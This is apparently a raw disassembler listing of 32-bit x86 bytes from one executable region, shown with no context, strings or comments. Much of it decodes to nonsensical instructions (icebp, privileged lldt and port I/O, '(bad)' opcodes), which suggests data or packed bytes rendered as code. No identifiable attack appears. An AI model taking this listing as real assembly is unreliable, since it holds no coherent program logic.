  408d92:	add    BYTE PTR [eax+0x42fcc2],dl
  408d98:	add    BYTE PTR [eax],al
  408d9a:	add    BYTE PTR [eax],al
  408d9c:	nop
  408d9d:	js     0x408d8d
  408d9f:	add    BYTE PTR [eax-0x6fbd030e],dl
  408da5:	jge    0x408d95
  408da7:	inc    edi
  408da9:	mov    eax,ds:0x7e9042fc
  408dae:	xlat   BYTE PTR ds:[ebx]
  408daf:	push   DWORD PTR [edi-0x6fbd036f]
  408db5:	jnp    0x408db2
  408db7:	jmp    DWORD PTR [edi-0x6fbd0834]
  408dbd:	mov    dl,0x0
  408dbf:	repz xchg edi,eax
  408dc1:	push   0xffffffcf
  408dc3:	icebp  
  408dc4:	shl    BYTE PTR [edx-0x4d6f1df3],cl
  408dca:	mov    esi,0x1eb2d2f1
  408dcf:	loop   0x408d61
  408dd1:	mov    dl,0xae
  408dd3:	icebp  
  408dd4:	shl    BYTE PTR [edx-0x4d6f1df5],cl
  408dda:	sahf   
  408ddb:	icebp  
  408ddc:	shl    BYTE PTR [edx-0x4d6f1e24],cl
  408de2:	into   
  408de3:	icebp  
  408de4:	shl    BYTE PTR [edx+0x6a47e1c9],cl
  408dea:	mov    edi,0xdab2d2f1
  408def:	(bad)  
  408df0:	aaa    
  408df1:	push   0xffffffaf
  408df3:	icebp  
  408df4:	shl    BYTE PTR [edx+0x6a27f2c7],cl
  408dfa:	xchg   edx,eax
  408dfb:	clc    
  408dfc:	shl    BYTE PTR [edx+0xf318],cl
  408e02:	add    BYTE PTR [eax],al
  408e04:	add    BYTE PTR [edi],dl
  408e06:	push   0x4f
  408e08:	icebp  
  408e09:	push   edx
  408e0a:	mov    dl,0x15
  408e0c:	loop   0x408d9e
  408e0e:	mov    dl,0x3e
  408e10:	icebp  
  408e11:	push   edx
  408e12:	mov    dl,0xf6
  408e14:	loope  0x408da6
  408e16:	mov    dl,0x2e
  408e18:	icebp  
  408e19:	push   edx
  408e1a:	mov    dl,0xf3
  408e1c:	loope  0x408dae
  408e1e:	mov    dl,0x1e
  408e20:	icebp  
  408e21:	push   edx
  408e22:	mov    dl,0xd4
  408e24:	loope  0x408db6
  408e26:	mov    dl,0x4e
  408e28:	icebp  
  408e29:	push   edx
  408e2a:	mov    dl,0xd1
  408e2c:	loope  0x408df5
  408e2e:	imul   edi,DWORD PTR [edi],0xb2b252f1
  408e34:	(bad)  
  408e35:	mov    bh,0x69
  408e37:	das    
  408e38:	icebp  
  408e39:	push   edx
  408e3a:	mov    dl,0xe
  408e3c:	mov    edi,0x1df069a2
  408e41:	cwde   
  408e42:	hlt    
  408e43:	push   cs
  408e44:	push   ds
  408e45:	mov    ds:0x80c0f069,eax
  408e4a:	hlt    
  408e4b:	push   cs
  408e4c:	adc    DWORD PTR [edx-0x4e],esi
  408e4f:	push   cs
  408e50:	mov    al,0x80
  408e52:	hlt    
  408e53:	push   cs
  408e54:	add    BYTE PTR [edx-0x4e],dh
  408e57:	push   cs
  408e58:	mov    al,ds:0xf30ef460
  408e5d:	jno    0x408e11
  408e5f:	push   cs
  408e60:	nop
  408e61:	pusha  
  408e62:	hlt    
  408e63:	push   cs
  408e64:	loop   0x408ed7
  408e66:	mov    dl,0xe
  408e68:	rol    BYTE PTR [eax],0x0
  408e6b:	add    BYTE PTR [eax],al
  408e6d:	add    BYTE PTR [eax-0xc],al
  408e70:	push   cs
  408e71:	aad    0x31
  408e73:	imul   esi,eax,0xef440b0
  408e79:	les    ebx,FWORD PTR [esi+0x69]
  408e7c:	lock mov al,ds:0xb70ef420
  408e82:	and    ch,BYTE PTR [ecx-0x10]
  408e85:	popf   
  408e86:	daa    
  408e87:	hlt    
  408e88:	push   cs
  408e89:	and    ebp,DWORD PTR es:[ecx-0x10]
  408e8d:	inc    eax
  408e8e:	add    ah,dh
  408e90:	push   cs
  408e91:	test   eax,0x30f06902
  408e96:	add    ah,dh
  408e98:	push   cs
  408e99:	test   al,0x2
  408e9b:	imul   esi,eax,0xef3e020
  408ea1:	stos   DWORD PTR es:[edi],eax
  408ea2:	loop   0x408f0c
  408ea4:	lock adc al,ah
  408ea7:	repz push cs
  408ea9:	stos   BYTE PTR es:[edi],al
  408eaa:	loop   0x408f14
  408eac:	lock inc eax
  408eae:	shl    bl,0xe
  408eb1:	lods   eax,DWORD PTR ds:[esi]
  408eb2:	ret    0xf068
  408eb5:	xor    al,al
  408eb7:	repz push cs
  408eb9:	add    ah,ah
  408ebb:	arpl   ax,si
  408ebd:	push   DWORD PTR [eax+0x62]
  408ec0:	dec    ebp
  408ec1:	add    bh,dh
  408ec3:	arpl   ax,si
  408ec5:	inc    DWORD PTR [eax+0x66004d62]
  408ecb:	pop    edi
  408ecc:	lock call DWORD PTR [eax+0x60]
  408ed0:	dec    ebp
  408ed1:	add    BYTE PTR [eax],al
  408ed3:	add    BYTE PTR [eax],al
  408ed5:	add    BYTE PTR [eax],al
  408ed7:	mov    cl,0x5d
  408ed9:	lock inc DWORD PTR [eax+0x60]
  408edd:	dec    ebp
  408ede:	add    al,al
  408ee0:	pop    ebp
  408ee1:	lock push DWORD PTR [eax]
  408ee4:	pusha  
  408ee5:	dec    ebp
  408ee6:	add    BYTE PTR [ebx+0xfff05d],dh
  408eec:	pusha  
  408eed:	dec    ebp
  408eee:	add    BYTE PTR [edx+0x50fff05d],ah
  408ef4:	pusha  
  408ef5:	dec    ebp
  408ef6:	add    BYTE PTR [ebp+0x5d],ch
  408ef9:	lock inc DWORD PTR [eax]
  408efc:	pusha  
  408efd:	dec    ebp
  408efe:	add    BYTE PTR [ebp+ebx*2-0x10],bh
  408f02:	push   eax
  408f04:	pop    edi
  408f05:	dec    ebp
  408f06:	add    BYTE PTR [edi+0x5d],ch
  408f09:	lock inc DWORD PTR [eax]
  408f0c:	pusha  
  408f0d:	dec    ebp
  408f0e:	add    dh,bl
  408f10:	pop    esi
  408f11:	lock call DWORD PTR [eax+0x5f]
  408f15:	dec    ebp
  408f16:	add    BYTE PTR [ecx+0x5f],cl
  408f19:	lock inc eax
  408f1c:	pop    edi
  408f1d:	dec    ebp
  408f1e:	add    BYTE PTR [eax],bl
  408f20:	pop    edi
  408f21:	lock push DWORD PTR [eax+0xb004d5f]
  408f28:	pop    edi
  408f29:	lock inc DWORD PTR [eax+0x1a004d5f]
  408f30:	pop    edi
  408f31:	lock call DWORD PTR [eax+0x5f]
  408f35:	dec    ebp
  408f36:	add    BYTE PTR [eax+0xfffb25],dl
  408f3c:	add    BYTE PTR [eax],al
  408f3e:	add    BYTE PTR [eax],al
  408f40:	mov    edi,0x9042f7a2
  408f45:	inc    esi
  408f46:	sti    
  408f47:	jmp    FWORD PTR [edi-0x6fbd086e]
  408f4d:	inc    edi
  408f4e:	sti    
  408f4f:	call   FWORD PTR [edi-0x6fbd083e]
  408f55:	test   al,0xf9
  408f57:	dec    DWORD PTR [edi-0x6fbd068e]
  408f5d:	mov    eax,ds:0x227ffff9
  408f62:	stc    
  408f63:	inc    edx
  408f64:	nop
  408f65:	xchg   edx,eax
  408f66:	stc    
  408f67:	jmp    FWORD PTR [edi+0x12]
  408f6a:	stc    
  408f6b:	inc    edx
  408f6c:	nop
  408f6d:	ret    
  408f6e:	stc    
  408f6f:	call   FWORD PTR [edi+0x42]
  408f72:	stc    
  408f73:	inc    edx
  408f74:	nop
  408f75:	hlt    
  408f76:	stc    
  408f77:	dec    DWORD PTR [edi+0x72]
  408f7a:	stc    
  408f7b:	inc    edx
  408f7c:	nop
  408f7d:	popf   
  408f7e:	stc    
  408f7f:	(bad)  
  408f80:	aas    
  408f81:	and    bh,cl
  408f83:	inc    edx
  408f84:	nop
  408f85:	mov    ?,ecx
  408f87:	jmp    FWORD PTR [edi]
  408f89:	adc    bh,cl
  408f8b:	inc    edx
  408f8c:	nop
  408f8d:	mov    edi,0x421ffff9
  408f92:	stc    
  408f93:	inc    edx
  408f94:	nop
  408f95:	jo     0x408f92
  408f97:	dec    DWORD PTR [edi]
  408f99:	repnz clc 
  408f9b:	inc    edx
  408f9c:	nop
  408f9d:	jns    0x408f9a
  408f9f:	(bad)  
  408fa0:	jmp    DWORD PTR [ecx+0x42f8]
  408fa6:	add    BYTE PTR [eax],al
  408fa8:	add    BYTE PTR [eax-0x10000486],dl
  408fae:	xchg   ecx,eax
  408faf:	clc    
  408fb0:	inc    edx
  408fb1:	nop
  408fb2:	jnp    0x408f9e
  408fb4:	add    BYTE PTR [eax-0x6fbd073e],dl
  408fba:	mov    dl,0x84
  408fbc:	in     eax,0x90
  408fbe:	mov    dl,0x4e
  408fc0:	not    BYTE PTR [edx-0x4e]
  408fc3:	xor    esp,0xef1266bf
  408fc9:	push   edx
  408fca:	mov    dl,0x82
  408fcc:	hlt    
  408fcd:	scas   eax,DWORD PTR es:[edi]
  408fce:	data16 and ch,bh
  408fd1:	push   edx
  408fd2:	mov    dl,0x7f
  408fd4:	hlt    
  408fd5:	lahf   
  408fd6:	xchg   ax,ax
  408fd8:	icebp  
  408fd9:	push   edx
  408fda:	mov    dl,0x40
  408fdc:	repz (bad) 
  408fde:	dec    di
  408fe0:	repnz shl BYTE PTR [edx+0x667fcf4d],cl
  408fe7:	mov    edi,0x5eb2d2f5
  408fec:	ret    0xae90
  408fef:	scas   al,BYTE PTR es:[edi]
  408ff0:	cmc    
  408ff1:	shl    BYTE PTR [edx+0x665fe64b],cl
  408ff7:	lahf   
  408ff8:	cmc    
  408ff9:	shl    BYTE PTR [edx-0x4c6f2ae4],cl
  408fff:	into   
  409000:	cmc    
  409001:	shl    BYTE PTR [edx+0x663ff309],cl
  409007:	mov    edi,0x1ab2d2f5
  40900c:	repz add BYTE PTR [eax],al
  40900f:	add    BYTE PTR [eax],al
  409011:	add    BYTE PTR [edi],ch
  409013:	scas   ax,WORD PTR es:[edi]
  409015:	cmc    
  409016:	shl    BYTE PTR [edx+0x661ff307],cl
  40901c:	lahf   
  40901d:	cmc    
  40901e:	shl    BYTE PTR [edx+0x660ff2d8],cl
  409024:	dec    edi
  409025:	cmc    
  409026:	push   edx
  409027:	mov    dl,0xd5
  409029:	in     eax,0x8f
  40902b:	mov    dl,0xe3
  40902d:	out    dx,al
  40902e:	push   edx
  40902f:	mov    dl,0xb6
  409031:	in     eax,0x9f
  409033:	mov    dl,0xe3
  409035:	out    dx,al
  409036:	push   edx
  409037:	mov    dl,0xe
  409039:	mov    ebx,0xeb0eb5f5
  40903e:	out    0xf0,al
  409040:	push   cs
  409041:	call   0xf0b6:0xeb0eb5b5
  409048:	push   cs
  409049:	popf   
  40904a:	mov    ch,0xb5
  40904c:	push   cs
  40904d:	jmp    0x408ff5
  40904f:	lock push cs
  409051:	jl     0x409008
  409053:	mov    ch,0xe
  409055:	jmp    0x40900d
  409057:	lock push cs
  409059:	jg     0x409010
  40905b:	mov    ch,0xe
  40905d:	jmp    0x409005
  40905f:	lock push cs
  409061:	pop    esi
  409062:	jbe    0x409019
  409064:	push   cs
  409065:	jmp    0x4090dd
  409067:	lock push cs
  409069:	push   ecx
  40906a:	jbe    0x409021
  40906c:	push   cs
  40906d:	jmp    0x4090d5
  40906f:	lock push cs
  409071:	inc    eax
  409072:	jbe    0x409029
  409074:	push   cs
  409075:	jmp    0x409077
  409077:	add    BYTE PTR [eax],al
  409079:	add    BYTE PTR [eax],al
  40907b:	jbe    0x40906d
  40907d:	push   cs
  40907e:	xor    esi,DWORD PTR [esi-0x4b]
  409081:	push   cs
  409082:	jmp    0x4090ea
  409084:	lock push cs
  409086:	and    dh,BYTE PTR [esi]
  409088:	mov    ch,0xe
  40908a:	jmp    0x4090c2
  40908c:	lock push cs
  40908e:	adc    eax,0xeb0eb536
  409093:	es lock push cs
  409096:	add    al,0x36
  409098:	mov    ch,0xe
  40909a:	jmp    0x4090d2
  40909c:	lock push cs
  40909e:	div    DWORD PTR ds:0x26eb0eb5
  4090a4:	lock push cs
  4090a6:	out    0xf5,al
  4090a8:	mov    ah,0xe
  4090aa:	jmp    0x4090a2
  4090ac:	out    dx,eax
  4090ad:	push   cs
  4090ae:	imul   esp,esp,0xfc300db1
  4090b4:	out    dx,eax
  4090b5:	push   cs
  4090b6:	add    BYTE PTR [eax+0x73],bh
  4090b9:	(bad)  
  4090bb:	mov    al,0x5e
  4090bd:	dec    ebp
  4090be:	add    BYTE PTR [ebx+0x4f],ch
  4090c1:	lock inc DWORD PTR [eax+0x3a004d5e]
  4090c8:	jle    0x4090d9
  4090ca:	add    DWORD PTR [eax+0x5e],edx
  4090cd:	dec    ebp
  4090ce:	add    BYTE PTR ds:0x80000f4f,ch
  4090d4:	pop    esi
  4090d5:	dec    ebp
  4090d6:	add    BYTE PTR [edi+ecx*2],bh
  4090d9:	(bad)  
  4090db:	jo     0x40913b
  4090dd:	dec    ebp
  4090de:	add    BYTE PTR [eax],al
  4090e0:	add    BYTE PTR [eax],al
  4090e2:	add    BYTE PTR [eax],al
  4090e4:	das    
  4090e5:	dec    edi
  4090e6:	sldt   WORD PTR [eax-0x1ffb2a2]
  4090ed:	push   eax
  4090ee:	lldt   WORD PTR [eax+0x60]
  4090f2:	dec    ebp
  4090f3:	add    cl,dh
  4090f5:	push   eax
  4090f6:	sldt   WORD PTR [eax+0x60]
  4090fa:	dec    ebp
  4090fb:	add    al,ah
  4090fd:	push   eax
  4090fe:	(bad)  
  409100:	xor    BYTE PTR [eax+0x4d],ah
  409103:	add    bl,dh
  409105:	push   eax
  409106:	sldt   WORD PTR [eax]
  409109:	pusha  
  40910a:	dec    ebp
  40910b:	add    dl,al
  40910d:	push   eax
  40910e:	lldt   WORD PTR [eax+0x60]
  409112:	dec    ebp
  409113:	add    BYTE PTR [ebp+0xf50],dh
  409119:	pusha  
  40911a:	dec    ebp
  40911b:	add    BYTE PTR [eax+edx*2+0x5ff0000f],ah
  409122:	dec    ebp
  409123:	add    BYTE PTR [edi+0xf50],dh
  409129:	pusha  
  40912a:	dec    ebp
  40912b:	add    BYTE PTR [esi+0x50000f50],al
  409131:	pop    edi
  409132:	dec    ebp
  409133:	add    BYTE PTR [eax-0x8000617],dl
  409139:	mov    ds:0xa9042fb,al
  40913e:	cli    
  40913f:	jmp    edi
  409141:	xchg   edx,eax
  409142:	sti    
  409143:	inc    edx
  409144:	nop
  409145:	pop    es
  409146:	cli    
  409147:	inc    DWORD PTR [eax]
  409149:	add    BYTE PTR [eax],al
  40914b:	add    BYTE PTR [eax],al
  40914d:	xlat   BYTE PTR ds:[ebx]
  40914e:	ret    0x42fb
  409151:	nop
  409152:	call   0xf3089150
  409157:	sti    
  409158:	inc    edx
  409159:	nop
  40915a:	in     eax,0xf9
  40915c:	push   DWORD PTR [edi-0x6fbd045e]
  409162:	push   es
  409163:	cli    
  409164:	jmp    DWORD PTR [edi-0x6fbd046e]
  40916a:	add    edi,edx
  40916c:	call   DWORD PTR [edi-0x6fbd043e]
  409172:	in     al,0xfa
  409174:	inc    DWORD PTR [edi-0x6fbd028e]
  40917a:	loope  0x409176
  40917c:	push   DWORD PTR [edi+0x22]
  40917f:	std    
  409180:	inc    edx
  409181:	nop
  409182:	sar    dl,cl
  409184:	jmp    DWORD PTR [edi+0x12]
  409187:	std    
  409188:	inc    edx
  409189:	nop
  40918a:	jmp    DWORD PTR [eax-0x2bd7801]
  409190:	inc    edx
  409191:	nop
  409192:	xor    bl,bh
  409194:	inc    DWORD PTR [edi+0x72]
  409197:	std    
  409198:	inc    edx
  409199:	nop
  40919a:	(bad)  
  40919c:	push   DWORD PTR [edi]
  40919e:	and    bh,ch
  4091a0:	inc    edx
  4091a1:	nop
  4091a2:	into   
  4091a3:	cli    
  4091a4:	jmp    DWORD PTR [edi]
  4091a6:	adc    bh,ch
  4091a8:	inc    edx
  4091a9:	nop
  4091aa:	sti    
  4091ab:	cli    
  4091ac:	call   DWORD PTR [edi]
  4091ae:	inc    edx
  4091af:	std    
  4091b0:	inc    edx
  4091b1:	add    BYTE PTR [eax],al
  4091b3:	add    BYTE PTR [eax],al
  4091b5:	add    BYTE PTR [eax+0x7f488b2],dl
  4091bb:	arpl   WORD PTR [edi-0xe],cx
  4091be:	push   edx
  4091bf:	mov    dl,0x85
  4091c1:	shl    bh,1
  4091c3:	ret    0xf23e
  4091c6:	push   edx
  4091c7:	mov    dl,0x86
  4091c9:	shl    bh,1
  4091cb:	ret    0xf22e
  4091ce:	push   edx
  4091cf:	mov    dl,0x83
  4091d1:	rcl    bh,1
  4091d3:	ret    0xf21e
  4091d6:	push   edx
  4091d7:	mov    dl,0x44
  4091d9:	rol    bh,1
  4091db:	ret    0xf24e
  4091de:	push   edx
  4091df:	mov    dl,0x41
  4091e1:	hlt    
  4091e2:	mov    bh,0x62
  4091e4:	aas    
  4091e5:	repnz push edx
  4091e7:	mov    dl,0x42
  4091e9:	hlt    
  4091ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091eb:	bound  ebp,QWORD PTR [edi]
  4091ed:	repnz push edx
  4091ef:	mov    dl,0x3f
  4091f1:	hlt    
  4091f2:	xchg   edi,eax
  4091f3:	bound  ebx,QWORD PTR [edi]
  4091f5:	repnz shl BYTE PTR [edx+0x6287f380],cl
  4091fc:	iret   
  4091fd:	icebp  
  4091fe:	shl    BYTE PTR [edx+0x6277e28d],cl
  409204:	mov    edi,0x9eb2d2f1
  409209:	iret   
  40920a:	bound  ebp,QWORD PTR [bx-0x2d0f]
  40920f:	mov    dl,0x8b
  409211:	repz push edi
  409213:	bound  ebx,QWORD PTR [edi+0x5cb2d2f1]
  409219:	repz add BYTE PTR [eax],al
  40921c:	add    BYTE PTR [eax],al
  40921e:	add    BYTE PTR [edi+0x62],al
  409221:	iret   
  409222:	icebp  
  409223:	shl    BYTE PTR [edx+0x6237f349],cl
  409229:	mov    edi,0x5ab2d2f1
  40922e:	repz daa 
  409230:	bound  ebp,QWORD PTR [edi+0xeb2d2f1]
  409236:	inc    edi
  409237:	and    esp,DWORD PTR [edx-0x10]
  40923a:	nop
  40923b:	add    ebp,esi
  40923d:	push   cs
  40923e:	xchg   esi,eax
  40923f:	add    esp,DWORD PTR [edx-0x10]
  409242:	inc    eax
  409243:	add    ebp,esi
  409245:	push   cs
  409246:	cdq    
  409247:	repnz popa 
  409249:	lock xor cl,ah
  40924c:	hlt    
  40924d:	push   cs
  40924e:	js     0x409242
  409250:	popa   
  409251:	lock and cl,ah
  409254:	hlt    
  409255:	push   cs
  409256:	jnp    0x40924a
  409258:	popa   
  409259:	lock adc cl,al
  40925c:	hlt    
  40925d:	push   cs
  40925e:	pop    edx
  40925f:	mov    dl,0x61
  409261:	lock inc eax
  409263:	shl    esp,0xe
  409266:	pop    ebp
  409267:	mov    dl,0x61
  409269:	lock xor BYTE PTR [ecx-0x4dc3f10c],ah
  409270:	popa   
  409271:	lock and BYTE PTR [ecx-0x4dc0f10c],ah
  409278:	popa   
  409279:	lock adc BYTE PTR [ecx+0x719e0ef4],al
  409280:	popa   
  409281:	lock rol BYTE PTR [eax],0x0
  409285:	add    BYTE PTR [eax],al
  409287:	add    BYTE PTR [eax+0x46910ef4],al
  40928d:	popa   
  40928e:	jo     0x409240
  409290:	pusha  
  409291:	hlt    
  409292:	push   cs
  409293:	adc    BYTE PTR [esi+0x61],0xf0
  409297:	mov    al,ds:0x730ef460
  40929c:	inc    esi
  40929d:	popa   
  40929e:	lock nop
  4092a0:	inc    eax
  4092a1:	hlt    
  4092a2:	push   cs
  4092a3:	bound  edx,QWORD PTR [esi+0x61]
  4092a6:	lock rol BYTE PTR [eax-0xc],0xe
  4092ab:	push   ebp
  4092ac:	inc    esi
  4092ad:	popa   
  4092ae:	lock mov al,0x20
  4092b1:	hlt    
  4092b2:	push   cs
  4092b3:	add    ah,cl
  4092b5:	jo     0x4092a7
  4092b7:	push   eax
  4092b9:	popa   
  4092ba:	dec    ebp
  4092bb:	add    BYTE PTR [edi+0x70],bl
  4092be:	lock jmp DWORD PTR [eax]
  4092c1:	bound  ecx,QWORD PTR [ebp+0x0]
  4092c4:	cs jo  0x4092b7
  4092c7:	call   DWORD PTR [eax+0x62]
  4092ca:	dec    ebp
  4092cb:	add    BYTE PTR [ecx-0x5ffef07e],ch
  4092d1:	bound  ecx,QWORD PTR [ebp+0x0]
  4092d4:	mov    eax,0xb0010f82
  4092d9:	bound  ecx,QWORD PTR [ebp+0x0]
  4092dc:	stos   DWORD PTR es:[edi],eax
  4092dd:	xor    al,0xff
  4092e0:	mov    al,ds:0x7a004d62
  4092e5:	lock call DWORD PTR fs:[eax+0x62]
  4092ea:	dec    ebp
  4092eb:	add    BYTE PTR [eax],al
  4092ed:	add    BYTE PTR [eax],al
  4092ef:	add    BYTE PTR [eax],al
  4092f1:	gs push ebx
  4092f3:	verr   WORD PTR [eax+0x62]
  4092f7:	dec    ebp
  4092f8:	add    BYTE PTR [ebx+edx*2+0xf],dh
  4092fc:	add    BYTE PTR [eax+0x62],dh
  4092ff:	dec    ebp
  409300:	add    BYTE PTR [edi-0x7e],ah
  409303:	smsw   WORD PTR [eax+0x36004d62]
  40930a:	ins    DWORD PTR es:[edi],dx
  40930b:	(bad)  
  40930d:	push   eax
  40930e:	push   0x6b31004d
  409313:	lock jmp DWORD PTR [eax]
  409316:	push   0x6620004d
  40931b:	lock push DWORD PTR [eax]
  40931e:	push   0x8833004d
  409323:	mov    eax,cr13
  409327:	dec    ebp
  409328:	add    BYTE PTR [edx],al
  40932a:	data16 lock (bad) 
  40932e:	push   0x1590004d
  409333:	cli    
  409334:	call   FWORD PTR [edi-0x6fbd07de]
  40933a:	es jmp 0xf853233f
  409340:	inc    edx
  409341:	nop
  409342:	pop    ss
  409343:	cli    
  409344:	call   FWORD PTR [edi-0x6fbd07be]
  40934a:	test   al,0xf9
  40934c:	dec    DWORD PTR [edi-0x6fbd080e]
  409352:	cdq    
  409353:	call   0x409358
  409358:	add    BYTE PTR [eax],al
  40935a:	nop
  40935b:	mov    ds:0xba9042f7,al
  409360:	call   0xf7d32365
  409365:	inc    edx
  409366:	nop
  409367:	mov    ebx,0xc29000e8
  40936c:	test   DWORD PTR [edx-0x70],0x9000e89c
  409373:	repnz test DWORD PTR [edx-0x70],0xafffe89d
  40937b:	mov    ds:0xbe9042f7,al
  409380:	call   0xf7d33384
  409385:	inc    edx
  409386:	nop
  409387:	mov    edi,0x798ffff9
  40938c:	test   BYTE PTR [edx-0x70],0x20
  409390:	sti    
  409391:	(bad)  
  409392:	jg     0x409406
  409394:	stc    
  409395:	inc    edx
  409396:	nop
  409397:	and    edx,ebp
  409399:	add    BYTE PTR [eax-0x6fbd06de],dl
  40939f:	adc    ch,dl
  4093a1:	add    BYTE PTR [eax-0x6fbd06ee],dl
  4093a7:	inc    ebx
  4093a8:	jmp    0x9042:0xf9429000
  4093af:	mov    dl,0xcc
  4093b1:	in     eax,0x90
  4093b3:	mov    dl,0xce
  4093b5:	not    dl
  4093b7:	mov    dl,0xb9
  4093b9:	in     eax,0x90
  4093bb:	mov    dl,0xbe
  4093bd:	test   BYTE PTR [eax],0x0
  4093c0:	add    BYTE PTR [eax],al
  4093c2:	add    dl,dl
  4093c4:	mov    dl,0xaa
  4093c6:	in     eax,0x90
  4093c8:	mov    dl,0xae
  4093ca:	not    dl
  4093cc:	mov    dl,0x97
  4093ce:	in     eax,0x90
  4093d0:	mov    dl,0x9e
  4093d2:	not    BYTE PTR [edx-0x4e]
  4093d5:	dec    eax
  4093d6:	in     eax,0x90
  4093d8:	mov    dl,0x4e
  4093da:	not    BYTE PTR [edx-0x4e]
  4093dd:	inc    ebp
  4093de:	in     eax,0x9f
  4093e0:	repnz not BYTE PTR ds:[edx-0x4e]
  4093e5:	inc    esi
  4093e6:	in     eax,0x8f
  4093e8:	repnz not BYTE PTR cs:[edx-0x4e]
  4093ed:	inc    ebx
  4093ee:	in     eax,0x9f
  4093f0:	repnz push ds
  4093f2:	not    BYTE PTR [edx-0x4e]
  4093f5:	add    al,0xe5
  4093f7:	(bad)  
  4093f8:	mov    dl,0xe3
  4093fa:	clc    
  4093fb:	push   edx
  4093fc:	mov    dl,0x1
  4093fe:	in     eax,0xaf
  409400:	pop    esi
  409401:	aas    
  409402:	not    BYTE PTR [edx-0x4e]
  409405:	add    ah,ch
  409407:	lahf   
  409408:	pop    esi
  409409:	das    
  40940a:	not    BYTE PTR [edx-0x4e]
  40940d:	jmp    esp
  40940f:	(bad)  
  409410:	pop    esi
  409411:	pop    ds
  409412:	not    dl
  409414:	mov    dl,0xc0
  409416:	out    0x7f,al
  409418:	pop    esi
  409419:	iret   
  40941a:	cmc    
  40941b:	shl    BYTE PTR [edx-0x4d602833],cl
  409421:	mov    esi,0xdeb2d2f5
  409426:	xlat   BYTE PTR ds:[ebx]
  409427:	add    BYTE PTR [eax],al
  409429:	add    BYTE PTR [eax],al
  40942b:	add    BYTE PTR [edi-0x2d0a514e],cl
  409431:	mov    dl,0xe
  409433:	ret    
  409434:	or     DWORD PTR [esi+0x0],ebx
  409437:	nop
  409438:	cmp    eax,0x36920ef1
  40943d:	scas   al,BYTE PTR es:[edi]
  40943e:	push   cs
  40943f:	jmp    0x40947f
  409441:	icebp  
  409442:	push   cs
  409443:	test   DWORD PTR [ebx],esp
  409445:	pop    esi
  409446:	lock mov al,0x1d
  409449:	icebp  
  40944a:	push   cs
  40944b:	xchg   esp,eax
  40944c:	and    ebx,DWORD PTR [esi-0x10]
  40944f:	mov    al,ds:0x870ef11d
  409454:	add    ebx,DWORD PTR [esi-0x10]
  409457:	nop
  409458:	std    
  409459:	lock push cs
  40945b:	push   esi
  40945c:	add    ebx,DWORD PTR [esi-0x10]
  40945f:	inc    eax
  409460:	std    
  409461:	lock push cs
  409463:	pop    ecx
  409464:	jecxz  0x4094c3
  409466:	lock sbb eax,0x380ef0e8
  40946c:	jecxz  0x4094cb
  40946e:	lock (bad) 
  409471:	lock push cs
  409473:	cmp    eax,ebx
  409475:	pop    ebp
  409476:	lock sbb eax,0x1a0ef0c8
  40947c:	ret    
  40947d:	pop    ebp
  40947e:	lock sub eax,0x1d0ef0b8
  409484:	mov    ds:0x9d30f05d,eax
  409489:	lock push cs
  40948b:	cld    
  40948c:	mov    ds:0x20f05d,al
  409491:	add    BYTE PTR [eax],al
  409493:	add    BYTE PTR [eax],al
  409495:	popf   
  409496:	lock push cs
  409498:	call   DWORD PTR [ebx-0x767bf14e]
  40949e:	lock push cs
  4094a0:	ficom  WORD PTR [ebx+0x79870eb2]
  4094a6:	lock push cs
  4094a8:	shl    DWORD PTR [edx+0x5d],1
  4094ab:	lock mov al,0x5c
  4094ae:	lock push cs
  4094b0:	add    BYTE PTR [eax+0x60],dl
  4094b3:	lock push DWORD PTR [eax]
  4094b6:	dec    bp
  4094b8:	add    BYTE PTR [ebx],al
  4094ba:	pusha  
  4094bb:	lock jmp DWORD PTR [eax]
  4094be:	dec    bp
  4094c0:	add    dl,dh
  4094c2:	pop    edi
  4094c3:	lock call DWORD PTR [eax+0x66]
  4094c7:	dec    ebp
  4094c8:	add    BYTE PTR ds:0xe0fff060,al
  4094ce:	gs dec ebp
  4094d0:	add    BYTE PTR [eax+eiz*2],dl
  4094d3:	lock push eax
  4094d6:	gs dec ebp
  4094d8:	add    BYTE PTR [edi+0x20000f57],al
  4094de:	dec    bp
  4094e0:	add    BYTE PTR [esi-0x4f],dh
  4094e3:	push   cs
  4094e4:	add    BYTE PTR [esi+0x5b],cl
  4094e7:	dec    ebp
  4094e8:	add    cl,bh
  4094ea:	mov    al,0xe
  4094ec:	add    cl,bh
  4094ee:	mov    al,0xe
  4094f0:	add    bl,ch
  4094f2:	mov    al,0xe
  4094f4:	add    BYTE PTR [ecx+0xfff070],cl
  4094fa:	add    BYTE PTR [eax],al
  4094fc:	add    BYTE PTR [eax],al
  4094fe:	hlt    
  4094ff:	mov    al,0xe
  409501:	add    BYTE PTR [eax-0x50fff150],bh
  409507:	mov    al,0xe
  409509:	add    cl,bl
  40950b:	inc    ebx
  40950c:	lock (bad) 
  40950e:	mov    esp,0xc9000eb0
  409513:	inc    ebx
  409514:	lock (bad) 
  409516:	in     eax,dx
  409517:	add    al,0x83
  409519:	jmp    0x40949d
  40951b:	pop    esi
  40951c:	push   ss
  40951d:	cmp    DWORD PTR [esi-0x385b2266],esp
  409523:	dec    esi
  409524:	lahf   
  409525:	mov    gs,WORD PTR ds:0x225a290d
  40952b:	(bad)  
  40952c:	pop    esp
  40952d:	mov    ah,0x90
  40952f:	pop    ecx
  409530:	clc    
  409531:	enter  0xce2,0x79
  409535:	scas   al,BYTE PTR es:[edi]
  409536:	jnp    0x4094fb
  409538:	xchg   BYTE PTR [edi],bl
  40953a:	sti    
  40953b:	adc    DWORD PTR [ebx+0x3b],0xde9b0c91
  409542:	loope  0x40951e
  409544:	pop    ebp
  409545:	lds    esi,FWORD PTR [eax]
  409547:	sub    eax,0xe46c6153
  40954c:	js     0x4095a0
  40954e:	int    0x7e
  409550:	ror    DWORD PTR ds:0x58c15967,0x5f
  409557:	xchg   ebp,eax
  409558:	mov    edi,0xbf88571d
  40955d:	ja     0x40952e
  40955f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409560:	lahf   
  409561:	add    BYTE PTR ss:[eax],al
  409564:	add    BYTE PTR [eax],al
  409566:	add    bl,cl
  409568:	rol    BYTE PTR [esi],1
  40956a:	in     al,0x29
  40956c:	and    DWORD PTR [edx-0x3e116ec3],edx
  409572:	pop    esi
  409573:	and    bl,bh
  409575:	pop    esp
  409576:	add    edx,DWORD PTR [edx+0x44]
  409579:	pusha  
  40957a:	cmp    cl,BYTE PTR [ebx]
  40957c:	ret    0x87b3
  40957f:	and    esi,0xaacfffb8
  409585:	or     eax,0x8cc90c40
  40958a:	push   0x5
